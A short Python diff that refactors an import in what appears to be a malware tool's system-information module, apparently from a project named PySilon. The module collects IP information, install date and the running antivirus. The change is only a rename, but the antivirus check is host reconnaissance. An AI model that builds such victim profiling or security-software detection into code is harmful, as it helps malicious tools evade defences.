@@ -7,7 +7,7 @@ from datetime import datetime
 import psutil
 import ctypes
 import os
-from av_detect import check_running_antivirus
+import resources.modules.av_detect as pysilon_av_detect
 
 def get_ip_info(ip):
     try:
@@ -108,7 +108,7 @@ def get_info():
         info['install_date'] = 'Unknown'
 
     try:
-        info['antivirus'] = check_running_antivirus()
+        info['antivirus'] = pysilon_av_detect.check_running_antivirus()
     except Exception:
         info['antivirus'] = 'Unknown'
     
